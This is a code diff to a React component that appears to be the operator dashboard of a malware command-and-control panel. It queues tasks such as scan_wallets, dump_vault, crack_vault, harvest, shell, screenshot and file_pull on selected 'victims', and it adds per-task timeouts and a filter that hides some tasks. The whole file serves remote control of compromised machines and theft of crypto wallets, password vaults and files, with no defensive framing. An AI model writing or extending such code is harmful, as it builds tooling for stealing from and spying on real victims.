@@ -19,23 +19,38 @@ const defaults: Record<string, Record<string, unknown>> = {
   file_pull: { path: '' }
 };
 
+const timeouts: Record<string, number> = {
+  scan_wallets: 300,
+  dump_vault: 300,
+  crack_vault: 180,
+  harvest: 180,
+  shell: 60,
+  screenshot: 60,
+  file_pull: 120
+};
+
 export function TaskDialog({
   open,
   onOpenChange,
   victimIds,
-  victims
+  victims,
+  linked = true
 }: {
   open: boolean;
   onOpenChange: (open: boolean) => void;
   victimIds: string[];
   victims?: Array<{ id: string; hostname: string }>;
+  linked?: boolean;
 }) {
   const [name, setName] = useState('scan_wallets');
   const [params, setParams] = useState('{}');
   const [priority, setPriority] = useState(0);
-  const [timeout, setTimeout] = useState(120);
+  const [timeout, setTimeout] = useState(300);
   const [busy, setBusy] = useState(false);
   const templates = useApiTemplates();
+  const names = linked
+    ? Object.keys(defaults)
+    : Object.keys(defaults).filter((task) => task !== 'crack_vault' && task !== 'screenshot');
 
   async function submit(event: React.FormEvent) {
     event.preventDefault();
@@ -43,8 +58,9 @@ export function TaskDialog({
     setBusy(true);
     try {
       const parsed = JSON.parse(params || '{}') as Record<string, unknown>;
-      await mutate<{ items: Task[] }>('/tasks', 'POST', { victim_ids: victimIds, name, params: parsed, priority, timeout_sec: timeout });
-      toast.success(`Queued ${name} on ${victimIds.length} victim(s)`);
+      const chosen = names.includes(name) ? name : names[0]!;
+      await mutate<{ items: Task[] }>('/tasks', 'POST', { victim_ids: victimIds, name: chosen, params: parsed, priority, timeout_sec: timeout });
+      toast.success(`Queued ${chosen} on ${victimIds.length} victim(s)`);
       onOpenChange(false);
     } catch (error) {
       toast.error(error instanceof Error ? error.message : 'Queue failed');
@@ -63,8 +79,8 @@ export function TaskDialog({
         <form onSubmit={submit} className="mt-3 space-y-2.5">
           <div>
             <Label htmlFor="task-name">Task</Label>
-            <Select id="task-name" value={name} onChange={(event) => { setName(event.target.value); setParams(JSON.stringify(defaults[event.target.value] ?? {})); }} className="w-full">
-              {Object.keys(defaults).map((task) => <option key={task} value={task}>{task}</option>)}
+            <Select id="task-name" value={names.includes(name) ? name : names[0]} onChange={(event) => { setName(event.target.value); setParams(JSON.stringify(defaults[event.target.value] ?? {})); setTimeout(timeouts[event.target.value] ?? 120); }} className="w-full">
+              {names.map((task) => <option key={task} value={task}>{task}</option>)}
             </Select>
           </div>
           <div>
